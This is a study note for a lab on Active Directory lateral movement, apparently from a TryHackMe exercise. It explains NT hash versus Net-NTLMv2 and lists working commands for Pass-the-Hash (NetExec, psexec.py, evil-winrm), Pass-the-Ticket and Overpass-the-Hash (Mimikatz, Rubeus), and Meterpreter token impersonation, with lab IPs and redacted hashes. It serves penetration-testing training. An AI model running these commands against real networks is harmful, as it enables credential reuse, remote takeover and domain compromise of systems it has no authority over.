# 🔑 Pass-the-Hash & Credential Reuse

> **Topic:** Intro to AD Lateral Movement
>
> **Focus:** NTLM hash reuse, Pass-the-Hash, Pass-the-Ticket, Overpass-the-Hash and token impersonation.

---

# 📖 Overview

Lateral movement does not always require a plaintext password.

In many engagements, credential harvesting produces:

```text
NTLM Hash
```

rather than:

```text
Plaintext Password
```

Pass-the-Hash allows an attacker to use an NT hash directly for NTLM authentication.

---

# 🔬 How Pass-the-Hash Works

NTLM authentication uses a challenge-response mechanism.

Conceptually:

```text
Client
  ↓
Authentication Request
  ↓
Server Sends Random Challenge
  ↓
Client Uses NT Hash
  ↓
Challenge-Response
  ↓
Server Verifies Response
```

The critical point is:

> The plaintext password is not required to calculate the NTLM response.

Therefore, possessing the underlying NT hash can be sufficient for authentication.

---

# ⚠️ The Hash Confusion Trap

Two different values are often casually called "NTLM hashes."

They are not interchangeable.

| Type | Source | Format | Pass-the-Hash? |
|---|---|---|---|
| **NT hash** | SAM, NTDS.dit, LSASS | 32 hex characters | ✅ Yes |
| **Net-NTLMv2** | Network capture | Multi-field challenge-response | ❌ No |

---

# 1️⃣ NT Hash

Typical sources:

```text
SAM
NTDS.dit
LSASS
Mimikatz
secretsdump.py
```

This is the hash used in Pass-the-Hash.

---

# 2️⃣ Net-NTLMv2

May be captured through techniques such as:

```text
Responder
LLMNR poisoning
URL coercion
```

It is a challenge-response artefact.

It cannot be directly passed as an NT hash.

Typical next steps are:

```text
Crack
   OR
Relay
```

---

# 🧪 Using Harvested Loot

The supplied lab finds a local Administrator hash in:

```cmd
type C:\Users\Administrator\Documents\loot.txt
```

The relevant structure is:

```text
Administrator:RID:LM:NT:::
```

For example:

```text
Administrator:500:redacted:::
```

---

# 🔍 Understanding the Format

```text
Administrator
```

Account name.

```text
500
```

RID of the built-in Administrator.

```text
LM
```

LM hash field.

```text
NT
```

The NT hash required for Pass-the-Hash.

---

# 🌐 Scanning for Reused Local Admin Access

NetExec can test the same local Administrator hash against multiple hosts:

```bash
nxc smb 192.168.13.61 192.168.13.51 -u Administrator -H fa....12 --local-auth
```

The important option is:

```text
--local-auth
```

It tells NetExec to authenticate against each host's local SAM rather than the domain.

---

# 🟢 Understanding `(Pwn3d!)`

Example:

```text
[+] WRK1\Administrator:fa......12 (Pwn3d!)
[+] SERVER1\Administrator:fa.....12 (Pwn3d!)
```

The supplied material explains that:

```text
(Pwn3d!)
```

indicates local Administrator access.

Without it, credentials may still be valid but may not have administrative privileges.

---

# 💻 Pass-the-Hash with PsExec

Full LM:NT format:

```bash
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:fa.....12 Administrator@192.168.13.51
```

If only the NT hash is available:

```bash
psexec.py -hashes :fa......12 Administrator@192.168.13.51
```

This can produce a SYSTEM shell when the account has the necessary administrative rights.

---

# 🔐 Evil-WinRM with a Hash

```bash
evil-winrm -i 192.168.13.51 -u Administrator -H fa....12
```

This provides a PowerShell session using the hash rather than the plaintext password.

---

# 🔗 Lateral Movement Chain

The supplied lab demonstrates:

```text
WRK
 ↓
Local Administrator Hash
 ↓
NetExec
 ↓
Hash Valid on SERVER1
 ↓
Pass-the-Hash
 ↓
Administrator on SERVER1
 ↓
Discover Domain Admin Hash
```

---

# 3️⃣ Pass-the-Ticket

Instead of an NT hash, a stolen Kerberos ticket can be injected into the current session.

Example Mimikatz:

```text
mimikatz # kerberos::ptt ticket.kirbi
```

Rubeus:

```text
Rubeus.exe ptt /ticket:ticket.kirbi
```

This can be useful when NTLM authentication is restricted but Kerberos remains available.

---

# 4️⃣ Overpass-the-Hash

Also called:

```text
Pass-the-Key
```

It bridges NTLM and Kerberos.

Concept:

```text
NT Hash
   ↓
Request Kerberos TGT
   ↓
Kerberos Session
```

Mimikatz example:

```text
mimikatz # sekurlsa::pth /user:Administrator /domain:thm.loc /ntlm:fa0.....12 /run:cmd.exe
```

The supplied material notes that `klist` can then be used to observe the Kerberos ticket state.

---

# 5️⃣ Token Impersonation

If SYSTEM access already exists, another user's access token may be present on the host.

The supplied material demonstrates Incognito through Meterpreter:

```text
meterpreter > use incognito
```

List user tokens:

```text
meterpreter > list_tokens -u
```

Impersonate a token:

```text
meterpreter > impersonate_token "THM\\Administrator"
```

---

# 🎯 Why Token Impersonation Is Powerful

If a Domain Administrator is logged into the compromised host:

```text
Domain Admin Session
       ↓
Access Token in Memory
       ↓
SYSTEM Attacker
       ↓
Token Impersonation
       ↓
Domain Admin Context
```

No password or hash is necessarily required for this particular technique.

---

# 🧠 Key Takeaways

- Pass-the-Hash uses the underlying NT hash rather than the plaintext password.
- NT hashes and Net-NTLMv2 captures are different.
- Net-NTLMv2 cannot directly be used for Pass-the-Hash.
- `--local-auth` is important when testing a local account hash across hosts.
- `(Pwn3d!)` indicates administrative access in the supplied NetExec examples.
- Pass-the-Ticket works with stolen Kerberos tickets.
- Overpass-the-Hash uses an NT hash to obtain Kerberos authentication material.
- Token impersonation can abuse existing user sessions when SYSTEM access is already available.
- Reused local Administrator passwords can turn one compromised hash into access across multiple machines.
